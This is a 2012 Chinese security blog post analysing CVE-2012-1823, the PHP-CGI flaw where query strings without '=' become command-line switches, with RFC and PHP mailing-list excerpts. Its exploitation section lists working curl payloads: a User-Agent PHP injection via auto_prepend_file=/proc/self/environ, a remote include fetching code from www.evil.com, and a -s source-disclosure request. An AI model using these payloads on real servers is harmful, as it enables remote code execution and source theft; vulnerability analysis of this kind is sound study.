
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>CVE-2012-1823 漏洞原理分析 - Ourren</title>
  <meta name="author" content="ourren">

  
  <meta name="description" content="首先说明只是自己的一些理解和看法，能力有限如有错误望请指正，谢谢。
1、php三种模式
php运行一般有三种运行模式:CGI模式、DLL模式、FastCGI模式。
CGI模式：如果客户机请求一个php文件，Web服务器就调用php.exe(php5:php-cgi.exe)去解释这个文件， &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://test.ourren.com/2012/05/04/cve-2012-1823-analyse/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Ourren" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.useso.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.useso.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.useso.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Ourren</a></h1>
  
    <h2>关注技术，记录生活.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="test.ourren.com">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
    <li><a href="/">Home</a></li>
    <li><a href="http://www.ourren.com">Ourren</a></li>
    <li><a href="http://www.sec-wiki.com">SecWiki</a></li>
    <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">CVE-2012-1823 漏洞原理分析</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2012-05-04T00:00:00-07:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>4</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
        
        
            | <a href="#comments">留言</a>
        
      </p>
    
  </header>


<div class="entry-content"><p>首先说明只是自己的一些理解和看法，能力有限如有错误望请指正，谢谢。
1、php三种模式
php运行一般有三种运行模式:CGI模式、DLL模式、FastCGI模式。
CGI模式：如果客户机请求一个php文件，Web服务器就调用php.exe(php5:php-cgi.exe)去解释这个文件，然后再把解释的结果以网页的形式返回给客户机,fork-and-execute 模式。
DLL模式：Apache直接加载模块进行启动。
FastCGI模式：FastCGI是cgi的升级版本，启动后一直运行，不需要每次都fork一次。</p>

<p>2、整体流程
在这个RCE中，触发的整体过程如下:
用户提交的数据&mdash;>判定提交数据中是否有未编码的&#8217;=&lsquo;&ndash;(无)&ndash;>对该字符串进行解析&mdash;->转义元字符&mdash;->生成命令参数列表&mdash;->提交给CGI程序&mdash;->CGI进行处理。
从CGI RFC的标准说起，原文：</p>

<blockquote>4.4.  The Script Command Line

Some systems support a method for supplying an array of strings to
the CGI script.  This is only used in the case of an &#8216;indexed&#8217; HTTP
query, which is identified by a &#8216;GET&#8217; or &#8216;HEAD&#8217; request with a URI
query string that does not contain any unencoded &#8220;=&#8221; characters.  For
such a request, the server SHOULD treat the query-string as a
search-string and parse it into words, using the rules

search-string = search-word *( &#8220;+&#8221; search-word )
search-word   = 1*schar
schar         = unreserved | escaped | xreserved
xreserved     = &#8220;;&#8221; | &#8220;/&#8221; | &#8220;?&#8221; | &#8220;:&#8221; | &#8220;@&#8221; | &#8220;&&#8221; | &#8220;=&#8221; | &#8220;,&#8221; |
&#8221;$&#8221;

After parsing, each search-word is URL-decoded, optionally encoded in
a system-defined manner and then added to the command line argument
list.

If the server cannot create any part of the argument list, then the
server MUST NOT generate any command line information.  For example,
the number of arguments may be greater than operating system or
server limits, or one of the words may not be representable as an
argument.

The script SHOULD check to see if the QUERY_STRING value contains an
unencoded &#8220;=&#8221; character, and SHOULD NOT use the command line
arguments if it does.</blockquote>


<p>理解：
一些系统为了让CGI程序获取查询参数。处理如下,只允许有索引的查询（比如说GET,HEAD，同时提交参数中不能有未编码的&#8217;=&lsquo;），成功的话服务端程序就需要把这个查询字符当做搜索字符，并解析为不同字符，并按照规则进行处理，例如：
[code lang=&ldquo;php&rdquo;]      search-string = search-word <em>( &ldquo;+&rdquo; search-word )  //查询字符
      search-word   = 1</em>schar                            //提交的字符
      schar         = unreserved | escaped | xreserved    //解析后的结果
      xreserved     = &ldquo;;&rdquo; | &ldquo;/&rdquo; | &ldquo;?&rdquo; | &ldquo;:&rdquo; | &ldquo;@&rdquo; | &ldquo;&amp;&rdquo; | &ldquo;=&rdquo; | &ldquo;,&rdquo; | &ldquo;$&rdquo;    //需要转义的字符[/code]
通过解析后，就把这些字符添加到参数列表中。如果服务器不能创建参数列表，那么就不需要生成任何命令信息。同时如果查询参数中包含有未编码的&rsquo;=&lsquo;，那么就不用解析参数。
通过对Apache处理CGI RFC中发现，如果查询字符中未包含未编码的&rsquo;=&lsquo;，那么字符就会用&rsquo;+&lsquo;(编码的空格)符号进行分割，然后进行元字符转义，最后传递给CGI程序。
但是不幸的是，PHP开发者忘记了RFC这部分内容，在2004年移除了这部分与其他地方冲突的代码，原文如下：</p>

<blockquote>From: Rasmus Lerdorf <rasmus <at> lerdorf.com>
Subject: [PHP-DEV] php-cgi command line switch memory check
Newsgroups: gmane.comp.php.devel
Date: 2004-02-04 23:26:41 GMT (7 years, 49 weeks, 3 days, 20 hours and 39 minutes ago)

In our SAPI cgi we have a check along these lines:

if (getenv(&#8220;SERVER_SOFTWARE&#8221;)
|| getenv(&#8220;SERVER_NAME&#8221;)
|| getenv(&#8220;GATEWAY_INTERFACE&#8221;)
|| getenv(&#8220;REQUEST_METHOD&#8221;)) {
cgi = 1;
}
//在这里进行判定，如果CGI程序运行在网络环境中，不对提交的参数进行解析，这样是没有漏洞的，但是由于某些原因进行了移除。

if(!cgi) getopt(&#8230;)

As in, we do not parse command line args for the cgi binary if we are
running in a web context.  At the same time our regression testing system
tries to use the cgi binary and it sets these variables in order to
properly test GET/POST requests.  From the regression testing system we
use -d extensively to override ini settings to make sure our test
environment is sane.  Of course these two ideas conflict, so currently our
regression testing is somewhat broken.  We haven&#8217;t noticed because we
don&#8217;t have many tests that have GET/POST data and we rarely build the cgi
binary.</blockquote>


<p>3、利用
查看php-cgi.exe的参数。
-s               Display colour syntax highlighted source.
-d foo[=bar]     Define INI entry foo with value &lsquo;bar&rsquo;
-n               No php.ini file will be used
导致的漏洞可以源码泄漏，本地包含和远程包含，copy GaRY的利用代码。
(1)本地包含直接执行代码:
curl -H &ldquo;USER-AGENT: &lt;?system(&lsquo;id&rsquo;);die();?>&rdquo; <a href="http://target.com/test.php?-dauto_prepend_file%3d/proc/self/environ+-n">http://target.com/test.php?-dauto_prepend_file%3d/proc/self/environ+-n</a></p>

<p>(2)远程包含执行代码:
curl <a href="http://target.com/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt">http://target.com/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt</a></p>

<p>(3)查看源码
<a href="http://target.com/test.php?-s">http://target.com/test.php?-s</a>
自己看了下php5中的php-cgi.exe貌似没有-r参数。</p>

<p>4、参考：
<a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/">http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a>
<a href="http://zone.wooyun.org/content/151">http://zone.wooyun.org/content/151</a></p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">ourren</span></span>

      




<time class='entry-date' datetime='2012-05-04T00:00:00-07:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>4</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
      

<span class="categories">
  
    <a class='category' href='/categories/security/'>security</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/2012/04/18/sdgt_brute_dic_tool/" title="Previous Post: Sdgt Project简介">&laquo; Sdgt Project简介</a>
      
      
        <a class="basic-alignment right" href="/2012/05/31/php_audit_dictionary/" title="Next Post: PHP源码审计字典">PHP源码审计字典 &raquo;</a>
      
    </p>
  </footer>
</article>


<section>
    <div id="comments" aria-live="polite"><!-- Duoshuo Comment BEGIN -->
<div class="ds-thread" data-title="CVE-2012-1823 漏洞原理分析"></div>
<script type="text/javascript">
  var duoshuoQuery = {short_name:"ourren"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = 'http://static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0] 
    || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
</script>
<!-- Duoshuo Comment END --></div>
</section>

</div>

<aside class="sidebar">
  
    <section>
    <h1>分类目录</h1>
    <ul>
        <li>
            <a href="http://blog.ourren.com/categories/life" title="life thing and think">生活</a>
        </li>
        <li><a href="http://blog.ourren.com/categories/research" title="do some research in daily life">研究</a>
        </li>
        <li><a href="http://blog.ourren.com/categories/security" title="all security articles">安全</a>
        </li>
        <li><a href="http://blog.ourren.com/categories/technology" title="all program and code">技术</a>
        </li>
    </ul>
</section><section>
    <h1>友情链接</h1>
    <ul>
        <li><a href="http://direwolf.gitcafe.com/" target="_blank">Direwolf</a></li>
        <li><a href="http://www.insight-labs.org/">insight-labs</a></li>
        <li><a href="http://lx.shellcodes.org/">lu4nx</a></li>
        <li><a href="http://www.metasploit.cn/forum.php" title="Metasploit 中文站" target="_blank">Metasploit</a></li>
        <li><a href="http://www.ourren.com/" target="_blank">ourren</a></li>
    </ul>
</section><section>
    <h1>广告</h1>
    <ul class="xoxo blogroll">
        <li><a href="http://www.gujinmall.net/" target="_blank">古今内衣旗舰店</a></li>
        <li><a href="http://www.meiguibailatu.com">玫瑰柏拉图旗舰店</a></li>
        <li><a href="http://ruishijundao.wangtx.com/">瑞士军刀背包</a></li>
        <li><a href="http://www.65w.cn/">诺力米特女装官网</a></li>
        <li><a href="http://www.cnartka.com" target="_blank">阿卡</a></li>
    </ul>
</section>
  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - ourren -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  











</body>
</html>
